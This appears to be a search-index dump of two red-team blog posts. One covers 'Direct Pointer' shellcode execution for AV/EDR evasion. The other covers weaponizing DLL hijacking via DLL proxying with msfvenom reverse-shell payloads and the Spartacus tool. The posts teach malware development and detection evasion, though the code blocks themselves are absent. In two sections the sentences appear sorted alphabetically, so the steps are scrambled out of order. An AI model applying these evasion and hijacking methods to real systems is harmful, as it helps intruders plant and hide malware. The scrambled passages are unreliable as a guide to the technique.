even BloodHound becomes impossible without malware development. Among the arsenal of evasion tactics lies one of my favorite - Direct Pointer execution. This is a subtle yet powerful maneuver that holds the potential to evade even the most vigilant security mechanisms.","If you want to support my work, feel free to become my Patreon"]},{"i":"what-is-direct-pointer-dp","l":"What is Direct Pointer (DP)","p":["At its core, direct pointer syntax enables attackers to execute malicious code stored within memory buffers, a.k.a shellcode execution. This technique bypasses conventional execution pathways, such as callback function calls or system APIs calls.","This evasion technique operates at a low level of memory manipulation to execute code directly from a memory address pointed to by a buffer.","Before diving deeper into the Direct Pointer itself, let me first explain what is a shellcode execution, why it is a big deal and what is its genuine workflow.","Even though the examples you will see in this blog can be replicated with any low level language, we will be using C, since I see it as the best language when it comes to explaining / performing memory operations, malware development or other low level activities."]},{"i":"what-is-a-shellcode","l":"What is a shellcode?","p":["At its core, shellcode is a set of assembly language instructions designed to perform a specific task. Initially named for its ability to spawn a shell, shellcode has evolved to encompass a broad spectrum of functionalities, ranging from executing arbitrary commands to downloading and executing additional malware. Shellcode is typically represented as hex, since it cannot be translated into human readable strings.","shellcode in raw format","And now here comes the question: Do I need to learn assembly in order to create my own shellcode?","The answer is simple and in the same time not that much: Depends!","Knowing assembly language is highly beneficial for creating shellcode, as shellcode is typically written in assembly due to its low-level nature and direct control over system resources. Assembly language provides precise control over the processor's instructions and memory layout, allowing you to craft compact and efficient shellcode tailored to specific architectures.","However, it's not strictly necessary for you to be native in assembly in order to create a shellcode. Several high-level tools, such as msfvenom and donut, can be used to develop custom shellcode. Of course, the shellcodes, generated from such tools would be extremely signatured by security vendors and much, much easier detectable by them. This is where knowing assembly comes into play. With the ability to craft manual and custom shellcode, your malware could become extremely evasive purely based on the shellcode itself.","Do NOT get me wrong on that. Evasion is not about a silver bullet (like custom shellcode) that pierces through endpoint protections, but rather a combination of techniques bond together. Having custom shellcode is extremely helpful, but still it must go along with other things, for example indirect syscalls.","Furthermore, familiarity with assembly language can be extremely valuable when analyzing shellcode or reverse engineering malware. As a tip, AI is extremely good with analyzing shellcodes.","ChatGPT analyzing calc shellcode from msfvenom in hex format","Now, I am also not an assembly guru, and within this blog, the shellcode examples will be generated using the msfvenom tool."]},{"i":"what-is-shellcode-execution","l":"What is shellcode execution?","p":["Shellcode execution refers to the process by which the malicious code (shellcode), is injected and executed within the memory space of a target process. This is the most difficult part from malware development standpoint, since the execution is the most watched action from AV and EDR vendors. And it makes total sense, you cannot achieve code execution, without the execution.","Shellcodes allows you as a penetration tester to fully customize your malware, including how this shellcode is allocated and then executed from memory. The ability to customize your malware is the key to evasiveness. The coolest part about the shellcodes, is that they can be used into executing completely everything, from a normal calculator as a POC, up to implants from modern C2 frameworks.","SUPER DUPER IMPORTANT NOTE: It does not matter how evasive your shellcode executor is, if they payload itself is not evasive also. This is mostly applicable for C2 payloads. Make sure to chose your C2 wisely based on the environment you are in, and also, customize them!"]},{"l":"Shellcode Execution workflow","p":["The shellcode execution flow is extremely simple as a concept. In windows you have this things called processes.","Running processes on Windows 10 machine, viewed from Process Hacker 2","A process represents an instance of a running program. Each process has its own executable image, which typically comes from an .exe file. It manages its resources independently, including memory, CPU time, and input/output operations. Processes are isolated from each other, ensuring stability and security by providing separate memory spaces, as well as shared ones. Each process is identified by a unique Process ID (PID) assigned by the operating system. Processes may consist of one or more threads, which are the basic units of CPU execution.","In theory, if we can inject into a process or create a new one, write our shellcode into its memory space, we would be able to execute it on very low level. Visually represented it looks something like that:","Workflow of shellcode execution","And from this point on, the malware development starts. Currently there are countless numbers of techniques, ones more evasive than others, all trying to achieve the same thing -> execute malicious payload undetected.","This is getting extremely hard with each day of penetration testing and red teaming. AVs and EDRs are constantly improving, by flagging and thus eliminating formerly effective techniques. With that, the infinite game of cat and mouse begins.","As already mentioned, there are extensive numbers of techniques that allows us as penetration testers, to allocate / write / execute our shellcodes. New techniques are being published each year, and the limit is only the human creativity. In this demo I want to keep things simple and explain how Direct Pointer execution works. For that purpose, we will stick to Win32 APIs."]},{"i":"what-are-these-windows-apis-win32-apis","l":"What are these Windows APIs (Win32 APIs)","p":["Windows APIs serves as essential toolsets for interaction with the Windows operating system and its underlying components. These APIs are essentially sets of functions and procedures packaged within libraries or DLLs (Dynamic Link Libraries). They enable access to various system resources and services, spanning a wide array of functionalities such as file I/O, networking, device management, and process or memory management.","In a nutshell, Win32 APIs are functions that allows us to go one step deeper into the mechanisms of the Windows OS. One way to look at that is, every time something happens in Windows, the corresponding API is called and used under the hood. For example:","Saving a file with notepad can trigger various Win32 APIs.","notepad.exe calling CreateFileW upon file save, debugged with WinDBG","Using debugger like WinDBG, its then possible to track the chain of events down until we reach the syscall instruction. This is where the switch from user mode to kernel mode is happening. While this is a topic for completely new blog, I just wanted to give a little insight that the Win32 API is just the beginning of series of functions and callbacks down the line. The APIs are just wrapped and easy to use methods, which are also easy to hook and thus, to track. There are again a lot of theory behind bypassing hooking, but we will dive into that in later blog posts.","Now, let's keep it simple!","Since the Direct Pointer works only if executed from the current process, we are going to skip touching on things like process injection.","Now, before we execute a shellcode, we must first have a one."]},{"l":"Implementation"},{"l":"Generating shellcode","p":["As mentioned, we are not going to dive into assembly for this part, but rather utilize msfvenom. This is an amazing tool which has the ability to not only generate a standard shellcodes, but also it can encrypt them and convert them into a language of your choice with huge language support. By default, if no format is specified, the shellcode will be outputted into raw format (.bin file).","raw shellcode from msfvenom","Raw shellcode files can be extremely useful for implementing staging techniques.","More on staging you can find on this video:","In this case, since we want to integrate this shellcode into our malicious program, we are going to use C as a format, so that the shellcode is directly outputted in such format after creation. This command can be used for the whole generation process:","generating shellcode with msfvenom","Keep note of the payload, msfvenom supports large payload sets, but in this time we define the payload to be just a simple reverse shell. So when we execute the payload on a targeted system, we should be able to catch the shell with simple netcat listener.","It is highly advised, especially if you are learning or testing your new technique, to use payload such as windows/x64/exec CMD=calc.exe since it is a smaller shellcode, and is easier to test if your execution method works."]},{"l":"Combining the pieces","p":["((void(*)())pAddr)(): Finally, this invokes the function that the pAddr has been cast to. The () at the end indicates a function call. Since pAddr has been cast to a function pointer, this line executes the function that pAddr points to.","(void(*)())pAddr: This part casts the variable pAddr to a function pointer of type (void(*)()). This casting essentially treats the contents of pAddr as if they were a function pointer.","After we have our memory allocated, it is time to write the shellcode to it. Yep, we are on step 2:","And finally the 4th parameter is the memory protection settings. In that case the memory region will be readable, writable and executable. This by itself is extremely bad oppsec practice, but here the goal is not to be oppsec safe!","And now here comes the funny part - Execution step.","By default, each process has at least 1 thread - the main one. Of course a lot more can be created during runtime, but at least 1 has to permanently exist as long as the process is alive. While APIs such as CreateThread are creating a new thread and executing the shellcode from there, the DP is doing quite the opposite.","Don't panic, let's break it down:","DP is directly navigating the current thread (main one if the process is single threaded) to execute the shellcode by pointing its execution flow into the memory space of the allocated shellcode. On this assembly level this is done with a jmp instruction. While it sounds scary, the syntax is even scarier at a first glance:","Executing the POC from powershell","Execution step","In a nutshell:","In order to use native C functions such as memcpy, you would need to include stdio.h library in your code.","In order to write it to the memory space of the process, we can once again call Windows APIs such as WriteProcessMemory or just call native C functions such as memcpy.","In other words, this syntax casts the executable memory region to function, and directly executes it by pointing the execution pointer to the start of the function. This C syntax on the assembly level, is literally translated into a jump instruction to the address allocated from VirtualAlloc.","Just by including windows.h into a C program, you can start using all Win32 APIs.","Pretty much we are on step 1: Allocating memory step","Receiving the reverse shell with netcat listener","Since we are operating into the same process, calling memcpy is considered the better approach. The signature for this function is as follows:","Since we now have our shellcode ready, lets combine the pieces and craft our malicious runner. For this demo, we will not perform any process injection, since the main goal is to explain Direct Pointer execution, which CANNOT support process injection!","So far as shown in the previous examples (for memory allocationg and write operations) we had various alternative to either use Win32 APIs or native C syntaxes and functions. Here this choice is still present. Usually, when a shellcode is present into the executable memory space of a process, it is enough to start a thread pointing to the allocated memory. This can be done with various Win32 APIs such as CreateThread or CreateThreadEx, but creating a thread is an extremely suspicious behavior. On the other hand, it is not the only way to execute the shellcode.","So far our shellcode is just a string variable, but shellcodes are machine instructions, remember? By sitting there as plain hex string, its not really useful to us.","The 3rd parameter is the memory type.","The arguments here are self explanatory, but in a nutshell we copy a variable called buf(our shellcode), into the memory region we just allocated pAddr(pointing to the beginning of the memory region). Keep in mind that the size here is extremely important, if that is messed up, the POC will not work.","The first parameter is NULL because we do not have the exact memory address from where the allocation to start. By specifying NULL, the OS will handle that automatically.","The first step is to declare our libraries and then the shellcode:","The good thing about Win32 APIs is that they are extremely well documented. By browsing the Microsoft Docs, you can get the functions signatures, and in best cases, example usage. Based on the docs, the VirtualAlloc API should be used like that:","The second parameter of the call is about the size of the memory we want to allocate","Then we need to allocate memory within the process address space, in order to write the shellcode into it. This can be done with various Win32 APIs such as VirtualAlloc or native C functions such as malloc.","Translating that to our little POC, this becomes:","void(*)(): This part declares a function pointer. Here, it specifies that we are dealing with a pointer to a function that returns nothing (void). The (*) syntax indicates a pointer to a function, and void specifies the return type of the function.","We define pointer to memory address as pAddr to be equal to the result of VirtualAlloc call.","What if instead of creating a new thread, we redirect the execution flow of the current thread to the written in memory shellcode? Well this is what the Direct Pointer (DP) really is.","When executed, the terminal hangs because the main thread is now executing the shellcode, which granted us a reverse shell, which hijacked the execution flow. In more simple term, the shellcode payload is simple and it will lock our application (the main thread in this case) until its running.","Which will translate to our code like:","While it is highly important to understand its parameters in details, referring to them now will prolong the blog to unimaginable length, so I highly advice you to read the docs and understand what all these parameters mean.","With that, our final piece of POC looks like that:","Writing payload step"]},{"l":"What is the BIG deal about Direct Pointer","p":["In the POC we implemented, there are countless numbers of suspicious artifacts, such as allocating memory with RWX primitives, keeping the shellcode within the binary itself or simply following the basic shellcode execution workflow with known Win32 APIs. All of these can end up flagging our binary, but here comes the fun part, the execution primitives is not the one which is flagged, but the rest!","In the implemented POC, the detections might come from anywhere, but not from the execution part. This is because the DP is extremely hard to be detected. Most AVs and EDRs are relying on mechanisms that can catch the memory allocation and writing primitives. Signatures are scanning the shellcode and memory scanners are scanning what happens in the Windows OS when the payload is executed, but the whole execution primitive in this case is extremely hard to be detected. By using DP, no new threads appear, no suspicious callback functions are called, nor any Win32 APIs methods.","Disclaimer: Just by using DP is of course not enough to be evasive, but this is one of my favorite execution techniques.","I encourage you to take the things from this blog one step further into examining various alternative Win32 APIs. Thankfully, there are already open source projects that can help us with that, one such is malapi. This project shows various Win32 APIs and for what they can be utilized."]},{"l":"Conclusion","p":["I think malware development is something that every pentester sooner or later will encounter. Having the knowledge of what is going on under the hood of Windows might take you a while, but its totally worth it especially if you are focused more into internal network testing and Active Directory.","Direct Pointer (DP) is one of my favorite execution techniques because it is extremely simple to implement, and scary evasive. I do NOT want you to take this for granted and just rely that only by using DP you will evade every AV and EDR, that's not how it works. A lot of work should still be done but definitely DP helps, a LOT!","If you want to support my work, feel free to become my Patreon, or just Buy Me A Coffee"]}],[{"l":"Weaponizing DLL Hijacking via DLL Proxying"},{"l":"Introduction","p":["Dynamic Link Library (DLL) is a collection of code that can be shared across multiple processes in Windows. A process imports a DLL when it needs to use functions or resources externally provided by it. For example, if a message box is displayed, the User32.dll would be imported to the running process.","DLL Hijacking is an attack, in which the intruder overwrites a specific and predefined DLL on the remote file system. When a process loads the overwritten library, a malicious code will be executed instead of the real one.","While DLL Hijacking is usually exploited for persistence, privilege escalation and lateral movement, it is a great technique for initial access, since it de-chains the download from the execution phase, which is highly suspicious behavior for EDRs (Endpoint Detection and Response).","A nice webinar on EDR evasion with DLL Hijacking can be found here: https://www.youtube.com/watch?v=CKfjLnEMfvI"]},{"l":"Theory","p":["The process of loading DLLs is automatically handled by the Windows OS. To demonstrate it let's take the following C code:","When executed, a message box will appear. If we inspect the program with Process Hacker 2 we can confirm that the user32.dll module is indeed loaded into the process.","user32.dll viewed from Process Hacker","If you replace one of the loaded DLL with a malicious one, the next time a process loads it, the malicious code inside will get executed. This is DLL Hijacking.","By default, in Windows OS, when an application loads dynamic link libraries (DLLs), the operating system follows a specific search order to locate these DLLs. The search order is prioritized as:","The directory from which the application is loaded: The system looks for DLLs in the same directory as the executable file of the application.","The current working directory: If the DLL is not found in the application's directory, the system searches the current working directory. However, be cautious with relying on the current working directory, as it can change during the execution of the program.","Windows System directories: If the DLL is not found in the application's directory or the current working directory, the system searches the directories listed in the system's PATH environment variable. This includes standard system directories like C:\\Windows\\System32.","Windows directories: If the DLL is not found in the aforementioned locations, the system searches the Windows directory.","Directories listed in the PATH environment variable: If the DLL is not found in any of the previous locations, the system searches the directories listed in the PATH environment variable.","This search priority is often abused for DLL Hijacking attacks, since a lot of applications will initially request a DLL from a folder where the user has write access rights over.","When developing an application, it is important to use full paths for the needed modules in order to avoid hijacking vulnerabilities."]},{"l":"Classical DLL Hijacking","p":["By \"Classical DLL Hijacking\" I mean the exploitation of DLL Hijacking vulnerability just for demonstrative purposes (a.k.a not caring about evasion, you just want to prove that the application is vulnerable).","During this blogpost I am using DVTA for my testing environment.","Finding a DLL Hijacking vulnerability is as simple as scanning different processes for their module imports, and overwriting a module if you have write access to the path on the filesystem where it is missing or loaded.","This behavior can be easily analyzed with tools like Process Monitor. If you specify the following filters, ProcMon will scan the defined process for all DLL imports.","Filtering DVTA process and all DLL imports","After the filters are applied it is recommended to restart the application for maximum coverage. Eventually, after watching the process activity you should come up to something like this:","DVTA cannot find C:\\Users\\lsec\\Desktop\\DVTA\\DVTA\\bin\\Release\\profapi.dll","This is a perfect candidate for DLL Hijacking attack, since the DVTA application is trying to load profapi.dll within my user's folder.","For generating a sample DLL, we can use either custom made one (recommended), or a msfvenom one. For the sake of the demo, I created the following custom DLL, to spawn \"calc.exe\" process.","DLL's entry point is called \"DLLMain\" and it executes code via various conditions on how the DLL is being called. When a process reads a function from the DLL it generally uses \"DLL_PROCESS_ATTACH\". We will store our custom code there! While this sample POC is designed to just spawn calc.exe, in real scenario you want your payload execution logic here!","The same behavior can be replicated with msfvenom:","After the DLL is generated, it is enough to just transfer it over the directory from where the application is trying to load it, and it is done. When the application is restarted and the DLL is re-imported, the payload behind will get executed.","Spawning calc.exe after placing profapi.dll and restarting the application","During the \"Classical DLL Hijacking\" attack, the targeted application will most likely stop working after the custom DLL is executed! This is because the application requires specific functions from the imported DLL and our custom one is lacking them."]},{"l":"DLL Proxying","p":["Additionally, the payload execution should not be handled poorly, if the payload execution thread corrupts the process, even though the exported functions are present, the application could still timeout.","After combining the pieces I created the following POC:","After executing the command, make sure to restart the targeted binary, and then terminate Spartacus by pressing enter. When stopped, it will generate similar output: Spartacus automatically using ProcMon to filter Hijackable DLLs","After performing DLL Hijacking with the compiled DLL, the binary executes as normal, while the shell callback is present. Application is running as expected","AV / EDR Evasion","DLL Proxying is when you embed the exported functions from the original DLL into your malicious one. This way when the DLL is hijacked and loaded, the malicious payload will get executed in parallel with the intended and needed exported functions.","From the output, Spartacus founds which DLLs are hijackable and forwardable, exported their functions and generated a C++ template for the DLLs.","I already have a video on DLL Proxying, so if you prefer watching instead of reading, feel welcomed to my channel:","In a DLL, an exported function is a function that is made available for other applications or DLLs to use. When a function is exported, it means that it is exposed and can be called by external programs. Exported functions could serve as entry points for other software components to utilize the functionality provided by the DLL.","In this example it is clear that the previously exploited profapi.dll is not a good match, since Spartacus cannot export its functions. However, CRYPTSP.dll looks like a better option.","No matter in which scenario the DLL Hijacking is needed, it is important to not break the application / environment of the victim. No matter how evasive your payloads are, if the client software is corrupted, it could easily lead to internal escalation.","Now let's tweek the malicious template from Spartacus! I created Offensive CPP repository, its idea is to host offensive C/C++ independent snippets, which can be used in various scenarios. Let's copy some shellcode execution code. During the demo, I am using the FileMap snippet.","Persistence","Privilege Escalation","Receiving the reverse shell","Since the \"Classical DLL Hijacking\" is super simple to perform, it is also extremely ineffective in real engagements. In order to weaponize this attack, it is important to understand \"why\".","Spartacus requires ProcMon to be installed.","Spartacus will automatically engage with ProcMon, setup filters and find DLL hijackable binaries. After finding such, it will try to export all the functions it needs from the mentioned DLL.","The application block is generally caused by 2 factors:","The C++ template for CRYPTSP.dll looks like this in my example:","The last step is to generate a shellcode from msfvenom:","The malicious DLL is missing the functions that are needed from the application.","The payload is hijacking the thread, which can result in a timeout.","To run Spartacus, you can follow the syntax:","To solve this problem we must perform something called DLL proxying. It looks like this: https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistenceDLL","Typically, the DLL Hijacking attacks are utilized for:","While each one of these topics are super complex and requires a lot of dedicated attention, we will not dive into them today. In this blog we will focus on how to weaponize the DLL Hijacking attack, so that it does not break the application runtime after the payload is executed. I am going to release more blogs on these topics in future! Stay tuned!","While this approach may sound super complex, there are tools that can export all the needed functions in C/C++ template. One such tool is called Spartacus."]},{"l":"Conclusion","p":["As mentioned before, DLL Hijacking on its own is a valid finding and often during pentests, it can be enough just to prove that the targeted application is vulnerable. However, in more complex cases, you may need to operate more stealthy.","Since the \"Classical DLL Hijacking\" is corrupting the workflow of the targeted application, this can be a huge IOC (Indicator Of Compromise). To evade being detected, before implementing any custom evasive payloads, you have to make sure that your techniques do not disrupt anyone's environment. While DLL Proxying may sound more complicated and requires additional programming skills, it is a nice way to weaponize the DLL Hijacking attack.","More on AV / EDR evasion blogs are yet to come!","Thank you for your attention, I really hope this blog was useful, if so, you can support me on:","Patreon","BuyMeACoffee","Youtube","Twitter","Github","Also make sure to join the Red Teaming Army Discord channel."]}]]